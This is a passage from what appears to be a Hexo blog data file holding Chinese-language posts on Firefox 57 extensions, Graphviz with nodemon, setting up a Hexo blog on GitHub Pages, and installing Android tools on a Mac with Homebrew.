57上所使用的新版插件列表，基本能够满足我的日常需求。</p>\n<h3 id=\"Evernote-Web-Clipper\"><a href=\"#Evernote-Web-Clipper\" class=\"headerlink\" title=\"Evernote Web Clipper\"></a>Evernote Web Clipper</h3><h3 id=\"Greasemonkey\"><a href=\"#Greasemonkey\" class=\"headerlink\" title=\"Greasemonkey\"></a>Greasemonkey</h3><p>虽然有人推荐试用Tampermonkey替代，但是目前为止Greasemonkey对于我仍然能够满足需求。</p>\n<h3 id=\"HTTPS-Everywhere\"><a href=\"#HTTPS-Everywhere\" class=\"headerlink\" title=\"HTTPS Everywhere\"></a>HTTPS Everywhere</h3><p>自动跳转到该网站的HTTPS版本，随着HTTPS的不断普及，相信这个插件会逐渐失去其功能。</p>\n<h3 id=\"LastPass\"><a href=\"#LastPass\" class=\"headerlink\" title=\"LastPass\"></a>LastPass</h3><p>密码管理，类似的还有其他几款管理软件。</p>\n<h3 id=\"Proxy-SwitchyMmega\"><a href=\"#Proxy-SwitchyMmega\" class=\"headerlink\" title=\"Proxy SwitchyMmega\"></a>Proxy SwitchyMmega</h3><p>以前的代理插件AutoProxy及后续的第三方更改版本基本每次Firefox一升级就要死一大片然后重新找，现在这个插件是Chrome上的对应移植版本，不用再担心一升级就失效了。目前试用国产中仍然感觉有一些bug。</p>\n<h3 id=\"uBlock-Origin\"><a href=\"#uBlock-Origin\" class=\"headerlink\" title=\"uBlock Origin\"></a>uBlock Origin</h3><p>新一代的广告过滤插件，对于Adblock Plus有着较大的优势。目前Adblock Plus已经堕落了，在社区内引起了几次争论，使得大家都对其持怀疑态度。</p>\n<h3 id=\"uMatrix\"><a href=\"#uMatrix\" class=\"headerlink\" title=\"uMatrix\"></a>uMatrix</h3><p>用于屏蔽网页无关脚本，可以辅助屏蔽第三方追踪脚本，是NoScript的替代品。</p>\n<h3 id=\"Vimium\"><a href=\"#Vimium\" class=\"headerlink\" title=\"Vimium\"></a>Vimium</h3><p>Vim快捷键插件，但是比原来的Vimperator权限小了很多，页面加载完成后才有效果。</p>\n<h3 id=\"Open-Tabs-Next-to-Current\"><a href=\"#Open-Tabs-Next-to-Current\" class=\"headerlink\" title=\"Open Tabs Next to Current\"></a>Open Tabs Next to Current</h3><p>新版插件功能不再有对标签外观和标签位置的更改能力，为此这个插件好像使用了一种方法绕过了限制，能够紧接当前标签新建一个新标签，此外在设置里面可以针对从当前页面打开的链接的标签位置进行配置。</p>\n<blockquote>\n<p>  about:config 设置browser.tabs.insertRelatedAfterCurrent 为true</p>\n</blockquote>\n<h2 id=\"缺少的插件\"><a href=\"#缺少的插件\" class=\"headerlink\" title=\"缺少的插件\"></a>缺少的插件</h2><h3 id=\"Down-Them-All\"><a href=\"#Down-Them-All\" class=\"headerlink\" title=\"Down Them All\"></a>Down Them All</h3><p>不再有类似的多线程轻量级下载工具，需要自己额外配置第三方下载软件。</p>\n<h2 id=\"Firefox57不足\"><a href=\"#Firefox57不足\" class=\"headerlink\" title=\"Firefox57不足\"></a>Firefox57不足</h2><p>目前的问题主要如下：</p>\n<ol>\n<li><p>Firefox57的SwitchyOmega会经常性的出现菜单显示不正常，参考[<a href=\"https://github.com/FelisCatus/SwitchyOmega/issues/1315]\">https://github.com/FelisCatus/SwitchyOmega/issues/1315]</a></p>\n</li>\n<li><p>在Mac下，Firefox57经常性的会出现高CPU占用情况，然后风扇狂转，最终我更换成了Firefox Nightly。</p>\n</li>\n</ol>\n"},{"title":"使用 Graphviz 来画图","date":"2017-12-03T20:27:45.000Z","_content":"\n# Graphviz 简介\n\n符合程序员的以代码生成一切事物的思想，并且类似 HTML ，只定义结构，样式则可以通过第三方工具来进行美化。\n\n例如 [oxygen](https://jeasonstudio.github.io/oxygen-demo/) 就是一个可以通过 Graphviz 代码来生成手绘风格图表的网站。\n\n# 基本概念\n\n`Node` 就是图的一个结点。\n\n`Edge` 连接两个结点之前\n\n`Graph` 定义了整个图片\n\n\n# 工具教程\n\n用过 NodeJS 的都了解，有一个 `supervisor` 命令能够监听目录，一旦发现文件发生改变后自动重启程序。发现 `dot` 命令并不存在自动监听生成图片的功能，因此改造了下，安装第三方工具 nodemon 来实现文件监听。\n\n```\nnpm install -g nodemon\n```\n\n然后运行命令 `nodemon -e .gv -x \"dot -Tpng -o test.png stack.gv\"` ，便实现了 nodemon 监听指定后缀名的功能，然后执行指定的命令。可惜的是暂时没有找到将发生文件变化的文件名作为变量传入到命令中的方法。\n\n# 参考\n\n[Guide](https://graphviz.gitlab.io/_pages/pdf/dotguide.pdf)","source":"_posts/Graphviz.md","raw":"title: 使用 Graphviz 来画图\ndate: 2017-12-03 20:27:45\ntags: []\n---\n\n# Graphviz 简介\n\n符合程序员的以代码生成一切事物的思想，并且类似 HTML ，只定义结构，样式则可以通过第三方工具来进行美化。\n\n例如 [oxygen](https://jeasonstudio.github.io/oxygen-demo/) 就是一个可以通过 Graphviz 代码来生成手绘风格图表的网站。\n\n# 基本概念\n\n`Node` 就是图的一个结点。\n\n`Edge` 连接两个结点之前\n\n`Graph` 定义了整个图片\n\n\n# 工具教程\n\n用过 NodeJS 的都了解，有一个 `supervisor` 命令能够监听目录，一旦发现文件发生改变后自动重启程序。发现 `dot` 命令并不存在自动监听生成图片的功能，因此改造了下，安装第三方工具 nodemon 来实现文件监听。\n\n```\nnpm install -g nodemon\n```\n\n然后运行命令 `nodemon -e .gv -x \"dot -Tpng -o test.png stack.gv\"` ，便实现了 nodemon 监听指定后缀名的功能，然后执行指定的命令。可惜的是暂时没有找到将发生文件变化的文件名作为变量传入到命令中的方法。\n\n# 参考\n\n[Guide](https://graphviz.gitlab.io/_pages/pdf/dotguide.pdf)","slug":"Graphviz","published":1,"updated":"2020-09-07T02:31:06.565Z","comments":1,"layout":"post","photos":[],"_id":"clypxqmmn000dxrn54chp95qe","content":"<h1 id=\"Graphviz-简介\"><a href=\"#Graphviz-简介\" class=\"headerlink\" title=\"Graphviz 简介\"></a>Graphviz 简介</h1><p>符合程序员的以代码生成一切事物的思想，并且类似 HTML ，只定义结构，样式则可以通过第三方工具来进行美化。</p>\n<p>例如 <a href=\"https://jeasonstudio.github.io/oxygen-demo/\">oxygen</a> 就是一个可以通过 Graphviz 代码来生成手绘风格图表的网站。</p>\n<h1 id=\"基本概念\"><a href=\"#基本概念\" class=\"headerlink\" title=\"基本概念\"></a>基本概念</h1><p><code>Node</code> 就是图的一个结点。</p>\n<p><code>Edge</code> 连接两个结点之前</p>\n<p><code>Graph</code> 定义了整个图片</p>\n<h1 id=\"工具教程\"><a href=\"#工具教程\" class=\"headerlink\" title=\"工具教程\"></a>工具教程</h1><p>用过 NodeJS 的都了解，有一个 <code>supervisor</code> 命令能够监听目录，一旦发现文件发生改变后自动重启程序。发现 <code>dot</code> 命令并不存在自动监听生成图片的功能，因此改造了下，安装第三方工具 nodemon 来实现文件监听。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install -g nodemon</span><br></pre></td></tr></table></figure>\n\n<p>然后运行命令 <code>nodemon -e .gv -x &quot;dot -Tpng -o test.png stack.gv&quot;</code> ，便实现了 nodemon 监听指定后缀名的功能，然后执行指定的命令。可惜的是暂时没有找到将发生文件变化的文件名作为变量传入到命令中的方法。</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://graphviz.gitlab.io/_pages/pdf/dotguide.pdf\">Guide</a></p>\n","excerpt":"","more":"<h1 id=\"Graphviz-简介\"><a href=\"#Graphviz-简介\" class=\"headerlink\" title=\"Graphviz 简介\"></a>Graphviz 简介</h1><p>符合程序员的以代码生成一切事物的思想，并且类似 HTML ，只定义结构，样式则可以通过第三方工具来进行美化。</p>\n<p>例如 <a href=\"https://jeasonstudio.github.io/oxygen-demo/\">oxygen</a> 就是一个可以通过 Graphviz 代码来生成手绘风格图表的网站。</p>\n<h1 id=\"基本概念\"><a href=\"#基本概念\" class=\"headerlink\" title=\"基本概念\"></a>基本概念</h1><p><code>Node</code> 就是图的一个结点。</p>\n<p><code>Edge</code> 连接两个结点之前</p>\n<p><code>Graph</code> 定义了整个图片</p>\n<h1 id=\"工具教程\"><a href=\"#工具教程\" class=\"headerlink\" title=\"工具教程\"></a>工具教程</h1><p>用过 NodeJS 的都了解，有一个 <code>supervisor</code> 命令能够监听目录，一旦发现文件发生改变后自动重启程序。发现 <code>dot</code> 命令并不存在自动监听生成图片的功能，因此改造了下，安装第三方工具 nodemon 来实现文件监听。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install -g nodemon</span><br></pre></td></tr></table></figure>\n\n<p>然后运行命令 <code>nodemon -e .gv -x &quot;dot -Tpng -o test.png stack.gv&quot;</code> ，便实现了 nodemon 监听指定后缀名的功能，然后执行指定的命令。可惜的是暂时没有找到将发生文件变化的文件名作为变量传入到命令中的方法。</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://graphviz.gitlab.io/_pages/pdf/dotguide.pdf\">Guide</a></p>\n"},{"title":"Hello World","date":"2014-11-20T22:19:23.000Z","_content":"\n这是我第二次使用github来发表博客。第一次的用户名暴露了太多，因此就使用了新的用户名:S0urceC0der，比较装逼吧，呵呵。\n\n## 为什么使用Github发表博客\n\n原因其实很简单，目前还没有心思打理一个主机，一般的博客网站编辑起来也比较麻烦，而Github提供了相当不错的静态网站访问功能。\n\n之前自己曾短暂的使用jekyll在Github上搭建博客，但是因为jekyll是Ruby写的，自己心里多多少少有所抵触，最终也没有坚持下来。而现在使用的Hexo，因为是Node写得，之前曾经使用过一阵，因此也比较亲切，看着各种主题也比较多，够酷够帅，也不用太折腾，就使用上了。\n\n写博客主要使用Markdown，一直以来都写的比较顺手，语法足够简单，真的是能够让人专注于内容写作，不用操心排版（虽然有时候要选择一个比较好的渲染邀请）。加上各种完美的字体与排版，比Word好多了，让人舒心。恐怕未来很长一段时间内，都是我写作的主要工具吧。\n\n我也会把以前的几篇文章，逐步转移到现在的这个博客上的，算是增加点内容吧。\n\n## 搭建Hexo\n\n### Github设置\n\n[Github Page](https://pages.github.com/)支持两种格式的静态页面:\n\n1. User Site: 仓库名称为username.github.io，其中username是你自己的用户名，主要用于个人的博客页面，页面数据存放在主干上。对应的访问页面就是http://username.github.io\n\n2. Project Site: 在指定的仓库下新建gh-pages分支存储页面，主要用于对某个项目的网页描述，对应的访问页面是http://username.github.io/repository\n\n当然，我的目标是个人博客，因此就新建了与用户名相同的个人仓库，并在主干上存放对应的静态页面文件。\n\n因为使用了Hexo生成静态页面，所以额外新建Source分支用于存储源代码（Hexo的工程），这样便可以在不同电脑随时随地检出进行修改，也实现了远程的文件备份。\n\n注意需要在本地的gitignore添加如下内容，以便不上传无用的文件内容：\n\n> public/       #Hexo生成的静态页面目录\n> node_modules/ #node模块安装目录\n\n### Git命令\n\n以下是创建仓库时的一些命令：\n\n`git config --global user.name 用户名`：设置用户名\n\n`git config --global user.email 邮箱`：设置邮箱\n\n`git branche source`：创建source分支\n\n`git checkout source`： 检出source分支\n\n`git checkout [file]`：回滚某个文件\n\n`git fetch origin`：升级仓库\n\n`git push origin source`或者`git push origin source:source`：将本地source分支推送到origin仓库的source分支中\n\n## 写作\n\n用Markdown语法写作，非常轻松\n\n### 添加照片\n\n将照片放到source/img文件夹内，然后使用 `![图片标题](/img/图片名称)`来显示\n\n### 额外功能\n\n除了标准的Markdown语法以外，还有新增了不少新的语法特性，这些语法特性，可以增强显示内容。\n\n## 博客发表\n\n`hexo n <title>`：发布博客\n\n`hexo g`：生成博客\n\n`hexo p`： 推送到github上\n\n## 2015-03-16更新\n\n昨天更新了一些软件，结果发现hexo生成的index.html是没有完全渲染过的，即仅包含ejs模板代码，几经搜索不知其解，便想着重装hexo，结果跑到官网一看，已经把包由`hexo`变成了`hexo-cli`，估计应该是版本升级有所变动。\n\n在重新安装完毕后，却又发现没有了之前的`clean deploy`等指令，重新新建了一个空的工程，对比了下package.json，才发现`hexo`的各种`generator`、`render`都已经剥离了，必须重新安装到当前目录下才行。最终，覆盖了原来的package.json，运行`cnpm install`之后，再次敲入`hexo`帮助，发现已经有了各种额外的指令。\n\n当一切都搞定后，才回过神来要去看下官网的[3.0 Changelog](https://github.com/hexojs/hexo/wiki/Breaking-Changes-in-Hexo-3.0)，的确在3.0版本中，更换了命令行，并进行了很多优化。文档中也提供了对应的[迁移指南](http://hexo.io/news/2015/03/05/hexo-3-0-released/#How_to_Update?)，自己还是过于懒惰不喜欢看文档，走了不该走的弯路。\n\n最后思考了下，认为这种做法的优点是：\n\n1. 框架与实现分离：剥离全局共用的指令（`-cli`库），`-cli`只提供最基本的功能，安装额外功能后，才具备额外功能。\n\n2. 实现在不同版本间的共存：只需要在package.json文件中指定具体版本即可。\n\n3. 减少了全局需要安装的内容\n\n## Todo\n\n<del>最好利用Github的教育优惠注册一个me域名</del>\n\n修改主题风格，添加一些插件等等\n","source":"_posts/Hello-World.md","raw":"title: Hello World\ndate: 2014-11-20 22:19:23\ntags:\n---\n\n这是我第二次使用github来发表博客。第一次的用户名暴露了太多，因此就使用了新的用户名:S0urceC0der，比较装逼吧，呵呵。\n\n## 为什么使用Github发表博客\n\n原因其实很简单，目前还没有心思打理一个主机，一般的博客网站编辑起来也比较麻烦，而Github提供了相当不错的静态网站访问功能。\n\n之前自己曾短暂的使用jekyll在Github上搭建博客，但是因为jekyll是Ruby写的，自己心里多多少少有所抵触，最终也没有坚持下来。而现在使用的Hexo，因为是Node写得，之前曾经使用过一阵，因此也比较亲切，看着各种主题也比较多，够酷够帅，也不用太折腾，就使用上了。\n\n写博客主要使用Markdown，一直以来都写的比较顺手，语法足够简单，真的是能够让人专注于内容写作，不用操心排版（虽然有时候要选择一个比较好的渲染邀请）。加上各种完美的字体与排版，比Word好多了，让人舒心。恐怕未来很长一段时间内，都是我写作的主要工具吧。\n\n我也会把以前的几篇文章，逐步转移到现在的这个博客上的，算是增加点内容吧。\n\n## 搭建Hexo\n\n### Github设置\n\n[Github Page](https://pages.github.com/)支持两种格式的静态页面:\n\n1. User Site: 仓库名称为username.github.io，其中username是你自己的用户名，主要用于个人的博客页面，页面数据存放在主干上。对应的访问页面就是http://username.github.io\n\n2. Project Site: 在指定的仓库下新建gh-pages分支存储页面，主要用于对某个项目的网页描述，对应的访问页面是http://username.github.io/repository\n\n当然，我的目标是个人博客，因此就新建了与用户名相同的个人仓库，并在主干上存放对应的静态页面文件。\n\n因为使用了Hexo生成静态页面，所以额外新建Source分支用于存储源代码（Hexo的工程），这样便可以在不同电脑随时随地检出进行修改，也实现了远程的文件备份。\n\n注意需要在本地的gitignore添加如下内容，以便不上传无用的文件内容：\n\n> public/       #Hexo生成的静态页面目录\n> node_modules/ #node模块安装目录\n\n### Git命令\n\n以下是创建仓库时的一些命令：\n\n`git config --global user.name 用户名`：设置用户名\n\n`git config --global user.email 邮箱`：设置邮箱\n\n`git branche source`：创建source分支\n\n`git checkout source`： 检出source分支\n\n`git checkout [file]`：回滚某个文件\n\n`git fetch origin`：升级仓库\n\n`git push origin source`或者`git push origin source:source`：将本地source分支推送到origin仓库的source分支中\n\n## 写作\n\n用Markdown语法写作，非常轻松\n\n### 添加照片\n\n将照片放到source/img文件夹内，然后使用 `![图片标题](/img/图片名称)`来显示\n\n### 额外功能\n\n除了标准的Markdown语法以外，还有新增了不少新的语法特性，这些语法特性，可以增强显示内容。\n\n## 博客发表\n\n`hexo n <title>`：发布博客\n\n`hexo g`：生成博客\n\n`hexo p`： 推送到github上\n\n## 2015-03-16更新\n\n昨天更新了一些软件，结果发现hexo生成的index.html是没有完全渲染过的，即仅包含ejs模板代码，几经搜索不知其解，便想着重装hexo，结果跑到官网一看，已经把包由`hexo`变成了`hexo-cli`，估计应该是版本升级有所变动。\n\n在重新安装完毕后，却又发现没有了之前的`clean deploy`等指令，重新新建了一个空的工程，对比了下package.json，才发现`hexo`的各种`generator`、`render`都已经剥离了，必须重新安装到当前目录下才行。最终，覆盖了原来的package.json，运行`cnpm install`之后，再次敲入`hexo`帮助，发现已经有了各种额外的指令。\n\n当一切都搞定后，才回过神来要去看下官网的[3.0 Changelog](https://github.com/hexojs/hexo/wiki/Breaking-Changes-in-Hexo-3.0)，的确在3.0版本中，更换了命令行，并进行了很多优化。文档中也提供了对应的[迁移指南](http://hexo.io/news/2015/03/05/hexo-3-0-released/#How_to_Update?)，自己还是过于懒惰不喜欢看文档，走了不该走的弯路。\n\n最后思考了下，认为这种做法的优点是：\n\n1. 框架与实现分离：剥离全局共用的指令（`-cli`库），`-cli`只提供最基本的功能，安装额外功能后，才具备额外功能。\n\n2. 实现在不同版本间的共存：只需要在package.json文件中指定具体版本即可。\n\n3. 减少了全局需要安装的内容\n\n## Todo\n\n<del>最好利用Github的教育优惠注册一个me域名</del>\n\n修改主题风格，添加一些插件等等\n","slug":"Hello-World","published":1,"updated":"2020-09-07T02:31:06.565Z","comments":1,"layout":"post","photos":[],"_id":"clypxqmmo000exrn553nd953e","content":"<p>这是我第二次使用github来发表博客。第一次的用户名暴露了太多，因此就使用了新的用户名:S0urceC0der，比较装逼吧，呵呵。</p>\n<h2 id=\"为什么使用Github发表博客\"><a href=\"#为什么使用Github发表博客\" class=\"headerlink\" title=\"为什么使用Github发表博客\"></a>为什么使用Github发表博客</h2><p>原因其实很简单，目前还没有心思打理一个主机，一般的博客网站编辑起来也比较麻烦，而Github提供了相当不错的静态网站访问功能。</p>\n<p>之前自己曾短暂的使用jekyll在Github上搭建博客，但是因为jekyll是Ruby写的，自己心里多多少少有所抵触，最终也没有坚持下来。而现在使用的Hexo，因为是Node写得，之前曾经使用过一阵，因此也比较亲切，看着各种主题也比较多，够酷够帅，也不用太折腾，就使用上了。</p>\n<p>写博客主要使用Markdown，一直以来都写的比较顺手，语法足够简单，真的是能够让人专注于内容写作，不用操心排版（虽然有时候要选择一个比较好的渲染邀请）。加上各种完美的字体与排版，比Word好多了，让人舒心。恐怕未来很长一段时间内，都是我写作的主要工具吧。</p>\n<p>我也会把以前的几篇文章，逐步转移到现在的这个博客上的，算是增加点内容吧。</p>\n<h2 id=\"搭建Hexo\"><a href=\"#搭建Hexo\" class=\"headerlink\" title=\"搭建Hexo\"></a>搭建Hexo</h2><h3 id=\"Github设置\"><a href=\"#Github设置\" class=\"headerlink\" title=\"Github设置\"></a>Github设置</h3><p><a href=\"https://pages.github.com/\">Github Page</a>支持两种格式的静态页面:</p>\n<ol>\n<li><p>User Site: 仓库名称为username.github.io，其中username是你自己的用户名，主要用于个人的博客页面，页面数据存放在主干上。对应的访问页面就是<a href=\"http://username.github.io/\">http://username.github.io</a></p>\n</li>\n<li><p>Project Site: 在指定的仓库下新建gh-pages分支存储页面，主要用于对某个项目的网页描述，对应的访问页面是<a href=\"http://username.github.io/repository\">http://username.github.io/repository</a></p>\n</li>\n</ol>\n<p>当然，我的目标是个人博客，因此就新建了与用户名相同的个人仓库，并在主干上存放对应的静态页面文件。</p>\n<p>因为使用了Hexo生成静态页面，所以额外新建Source分支用于存储源代码（Hexo的工程），这样便可以在不同电脑随时随地检出进行修改，也实现了远程的文件备份。</p>\n<p>注意需要在本地的gitignore添加如下内容，以便不上传无用的文件内容：</p>\n<blockquote>\n<p>public&#x2F;       #Hexo生成的静态页面目录<br>node_modules&#x2F; #node模块安装目录</p>\n</blockquote>\n<h3 id=\"Git命令\"><a href=\"#Git命令\" class=\"headerlink\" title=\"Git命令\"></a>Git命令</h3><p>以下是创建仓库时的一些命令：</p>\n<p><code>git config --global user.name 用户名</code>：设置用户名</p>\n<p><code>git config --global user.email 邮箱</code>：设置邮箱</p>\n<p><code>git branche source</code>：创建source分支</p>\n<p><code>git checkout source</code>： 检出source分支</p>\n<p><code>git checkout [file]</code>：回滚某个文件</p>\n<p><code>git fetch origin</code>：升级仓库</p>\n<p><code>git push origin source</code>或者<code>git push origin source:source</code>：将本地source分支推送到origin仓库的source分支中</p>\n<h2 id=\"写作\"><a href=\"#写作\" class=\"headerlink\" title=\"写作\"></a>写作</h2><p>用Markdown语法写作，非常轻松</p>\n<h3 id=\"添加照片\"><a href=\"#添加照片\" class=\"headerlink\" title=\"添加照片\"></a>添加照片</h3><p>将照片放到source&#x2F;img文件夹内，然后使用 <code>![图片标题](/img/图片名称)</code>来显示</p>\n<h3 id=\"额外功能\"><a href=\"#额外功能\" class=\"headerlink\" title=\"额外功能\"></a>额外功能</h3><p>除了标准的Markdown语法以外，还有新增了不少新的语法特性，这些语法特性，可以增强显示内容。</p>\n<h2 id=\"博客发表\"><a href=\"#博客发表\" class=\"headerlink\" title=\"博客发表\"></a>博客发表</h2><p><code>hexo n &lt;title&gt;</code>：发布博客</p>\n<p><code>hexo g</code>：生成博客</p>\n<p><code>hexo p</code>： 推送到github上</p>\n<h2 id=\"2015-03-16更新\"><a href=\"#2015-03-16更新\" class=\"headerlink\" title=\"2015-03-16更新\"></a>2015-03-16更新</h2><p>昨天更新了一些软件，结果发现hexo生成的index.html是没有完全渲染过的，即仅包含ejs模板代码，几经搜索不知其解，便想着重装hexo，结果跑到官网一看，已经把包由<code>hexo</code>变成了<code>hexo-cli</code>，估计应该是版本升级有所变动。</p>\n<p>在重新安装完毕后，却又发现没有了之前的<code>clean deploy</code>等指令，重新新建了一个空的工程，对比了下package.json，才发现<code>hexo</code>的各种<code>generator</code>、<code>render</code>都已经剥离了，必须重新安装到当前目录下才行。最终，覆盖了原来的package.json，运行<code>cnpm install</code>之后，再次敲入<code>hexo</code>帮助，发现已经有了各种额外的指令。</p>\n<p>当一切都搞定后，才回过神来要去看下官网的<a href=\"https://github.com/hexojs/hexo/wiki/Breaking-Changes-in-Hexo-3.0\">3.0 Changelog</a>，的确在3.0版本中，更换了命令行，并进行了很多优化。文档中也提供了对应的<a href=\"http://hexo.io/news/2015/03/05/hexo-3-0-released/#How_to_Update?\">迁移指南</a>，自己还是过于懒惰不喜欢看文档，走了不该走的弯路。</p>\n<p>最后思考了下，认为这种做法的优点是：</p>\n<ol>\n<li><p>框架与实现分离：剥离全局共用的指令（<code>-cli</code>库），<code>-cli</code>只提供最基本的功能，安装额外功能后，才具备额外功能。</p>\n</li>\n<li><p>实现在不同版本间的共存：只需要在package.json文件中指定具体版本即可。</p>\n</li>\n<li><p>减少了全局需要安装的内容</p>\n</li>\n</ol>\n<h2 id=\"Todo\"><a href=\"#Todo\" class=\"headerlink\" title=\"Todo\"></a>Todo</h2><p><del>最好利用Github的教育优惠注册一个me域名</del></p>\n<p>修改主题风格，添加一些插件等等</p>\n","excerpt":"","more":"<p>这是我第二次使用github来发表博客。第一次的用户名暴露了太多，因此就使用了新的用户名:S0urceC0der，比较装逼吧，呵呵。</p>\n<h2 id=\"为什么使用Github发表博客\"><a href=\"#为什么使用Github发表博客\" class=\"headerlink\" title=\"为什么使用Github发表博客\"></a>为什么使用Github发表博客</h2><p>原因其实很简单，目前还没有心思打理一个主机，一般的博客网站编辑起来也比较麻烦，而Github提供了相当不错的静态网站访问功能。</p>\n<p>之前自己曾短暂的使用jekyll在Github上搭建博客，但是因为jekyll是Ruby写的，自己心里多多少少有所抵触，最终也没有坚持下来。而现在使用的Hexo，因为是Node写得，之前曾经使用过一阵，因此也比较亲切，看着各种主题也比较多，够酷够帅，也不用太折腾，就使用上了。</p>\n<p>写博客主要使用Markdown，一直以来都写的比较顺手，语法足够简单，真的是能够让人专注于内容写作，不用操心排版（虽然有时候要选择一个比较好的渲染邀请）。加上各种完美的字体与排版，比Word好多了，让人舒心。恐怕未来很长一段时间内，都是我写作的主要工具吧。</p>\n<p>我也会把以前的几篇文章，逐步转移到现在的这个博客上的，算是增加点内容吧。</p>\n<h2 id=\"搭建Hexo\"><a href=\"#搭建Hexo\" class=\"headerlink\" title=\"搭建Hexo\"></a>搭建Hexo</h2><h3 id=\"Github设置\"><a href=\"#Github设置\" class=\"headerlink\" title=\"Github设置\"></a>Github设置</h3><p><a href=\"https://pages.github.com/\">Github Page</a>支持两种格式的静态页面:</p>\n<ol>\n<li><p>User Site: 仓库名称为username.github.io，其中username是你自己的用户名，主要用于个人的博客页面，页面数据存放在主干上。对应的访问页面就是<a href=\"http://username.github.io/\">http://username.github.io</a></p>\n</li>\n<li><p>Project Site: 在指定的仓库下新建gh-pages分支存储页面，主要用于对某个项目的网页描述，对应的访问页面是<a href=\"http://username.github.io/repository\">http://username.github.io/repository</a></p>\n</li>\n</ol>\n<p>当然，我的目标是个人博客，因此就新建了与用户名相同的个人仓库，并在主干上存放对应的静态页面文件。</p>\n<p>因为使用了Hexo生成静态页面，所以额外新建Source分支用于存储源代码（Hexo的工程），这样便可以在不同电脑随时随地检出进行修改，也实现了远程的文件备份。</p>\n<p>注意需要在本地的gitignore添加如下内容，以便不上传无用的文件内容：</p>\n<blockquote>\n<p>public&#x2F;       #Hexo生成的静态页面目录<br>node_modules&#x2F; #node模块安装目录</p>\n</blockquote>\n<h3 id=\"Git命令\"><a href=\"#Git命令\" class=\"headerlink\" title=\"Git命令\"></a>Git命令</h3><p>以下是创建仓库时的一些命令：</p>\n<p><code>git config --global user.name 用户名</code>：设置用户名</p>\n<p><code>git config --global user.email 邮箱</code>：设置邮箱</p>\n<p><code>git branche source</code>：创建source分支</p>\n<p><code>git checkout source</code>： 检出source分支</p>\n<p><code>git checkout [file]</code>：回滚某个文件</p>\n<p><code>git fetch origin</code>：升级仓库</p>\n<p><code>git push origin source</code>或者<code>git push origin source:source</code>：将本地source分支推送到origin仓库的source分支中</p>\n<h2 id=\"写作\"><a href=\"#写作\" class=\"headerlink\" title=\"写作\"></a>写作</h2><p>用Markdown语法写作，非常轻松</p>\n<h3 id=\"添加照片\"><a href=\"#添加照片\" class=\"headerlink\" title=\"添加照片\"></a>添加照片</h3><p>将照片放到source&#x2F;img文件夹内，然后使用 <code>![图片标题](/img/图片名称)</code>来显示</p>\n<h3 id=\"额外功能\"><a href=\"#额外功能\" class=\"headerlink\" title=\"额外功能\"></a>额外功能</h3><p>除了标准的Markdown语法以外，还有新增了不少新的语法特性，这些语法特性，可以增强显示内容。</p>\n<h2 id=\"博客发表\"><a href=\"#博客发表\" class=\"headerlink\" title=\"博客发表\"></a>博客发表</h2><p><code>hexo n &lt;title&gt;</code>：发布博客</p>\n<p><code>hexo g</code>：生成博客</p>\n<p><code>hexo p</code>： 推送到github上</p>\n<h2 id=\"2015-03-16更新\"><a href=\"#2015-03-16更新\" class=\"headerlink\" title=\"2015-03-16更新\"></a>2015-03-16更新</h2><p>昨天更新了一些软件，结果发现hexo生成的index.html是没有完全渲染过的，即仅包含ejs模板代码，几经搜索不知其解，便想着重装hexo，结果跑到官网一看，已经把包由<code>hexo</code>变成了<code>hexo-cli</code>，估计应该是版本升级有所变动。</p>\n<p>在重新安装完毕后，却又发现没有了之前的<code>clean deploy</code>等指令，重新新建了一个空的工程，对比了下package.json，才发现<code>hexo</code>的各种<code>generator</code>、<code>render</code>都已经剥离了，必须重新安装到当前目录下才行。最终，覆盖了原来的package.json，运行<code>cnpm install</code>之后，再次敲入<code>hexo</code>帮助，发现已经有了各种额外的指令。</p>\n<p>当一切都搞定后，才回过神来要去看下官网的<a href=\"https://github.com/hexojs/hexo/wiki/Breaking-Changes-in-Hexo-3.0\">3.0 Changelog</a>，的确在3.0版本中，更换了命令行，并进行了很多优化。文档中也提供了对应的<a href=\"http://hexo.io/news/2015/03/05/hexo-3-0-released/#How_to_Update?\">迁移指南</a>，自己还是过于懒惰不喜欢看文档，走了不该走的弯路。</p>\n<p>最后思考了下，认为这种做法的优点是：</p>\n<ol>\n<li><p>框架与实现分离：剥离全局共用的指令（<code>-cli</code>库），<code>-cli</code>只提供最基本的功能，安装额外功能后，才具备额外功能。</p>\n</li>\n<li><p>实现在不同版本间的共存：只需要在package.json文件中指定具体版本即可。</p>\n</li>\n<li><p>减少了全局需要安装的内容</p>\n</li>\n</ol>\n<h2 id=\"Todo\"><a href=\"#Todo\" class=\"headerlink\" title=\"Todo\"></a>Todo</h2><p><del>最好利用Github的教育优惠注册一个me域名</del></p>\n<p>修改主题风格，添加一些插件等等</p>\n"},{"title":"Mac上配置Android开发环境","date":"2017-01-21T19:42:02.000Z","_content":"\n## 在Mac上配置Android开发环境\n\n在Mac上配置Android开发环境，通常是直接下载安装Android Studio并运行其中的配置，有太多的手工操作，需要多次确认。因此我选择使用Homebrew来安装对应的软件。\n\nHomebrew可以自动安装多个Mac相关软件，以命令行程序为主，而Homebrew Cask包负责安装Mac上的App应用，安装时可以直接搜索，不必去各个网站单独下载，并且可以通过`brew upgrade`进行统一更新，免去了逐一手动更新的痛苦，目前大部分开发相关的应用都可以直接安装，基本能够达到替换App Store。\n\n### 配置基本android开发环境包\n\n正如上文所述，使用Homebrew进行软件管理的目的，所有软件均不会从官网下载，而只通过命令行安装。\n\n```\nbrew install ant\nbrew install maven\nbrew install gradle\nbrew install android-sdk\nbrew install android-ndk\n```\n\n允许android命令来安装Android开发环境，关于所需的包，可以参考[知乎-Android SDk Manager里面到底哪些东西是必须下载的？](https://www.zhihu.com/question/31935836)\n\n#### 安装HAXM\n\n这是唯一一步需要sudo操作的安装\n```\nbrew cask install intel-haxm\n```\n\n### 安装Android Studio\n\n```\nbrew cask install android-studio\n```\n\n允许Android Studio后，记得配置Android SDK路径为/usr/local/opt/android-sdk\n\n###","source":"_posts/Install-Android-with-Homebrew.md","raw":"title: Mac上配置Android开发环境\ndate: 2017-01-21 19:42:02\ntags: [\"Mac\", \"Android\"]\n---\n\n## 